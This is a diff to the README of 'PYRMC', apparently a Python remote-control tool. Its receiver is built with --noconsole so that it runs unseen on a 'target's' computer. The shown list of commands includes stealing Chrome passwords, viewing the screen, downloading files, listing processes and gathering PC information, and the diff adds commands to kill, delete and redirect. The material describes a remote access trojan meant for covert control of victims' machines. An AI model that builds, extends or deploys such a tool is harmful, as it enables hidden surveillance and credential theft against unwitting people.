@@ -121,12 +121,9 @@ PYRMC works with functions and attributes. From sender.py, you can send commands
 Assuming that you have used `--noconsole` when building reciever.py, there will be no terminal and all code will be running in the background.
 Below you can find the list of commands:
 ```python
-GET:
 !pcinfo
 !chromepasswords
 !processes
-
-OS:
 !import
 !playsound
 !viewscreen
@@ -134,10 +131,13 @@ OS:
 !displayvideo
 !displayimage
 !download
-
-LS:
 !ls
 !ls.storage
+!ip
+!message
+!kill
+!delete
+!redirect
 ```
 ### get.pcinfo ------------------------------------------------------
 ```get.pcinfo``` is a command that is pretty much self-explanitory, it allows you to gather pc information about the targets computer. This command has no other attributes and registering this command just gives you back the pc information of the targets computer
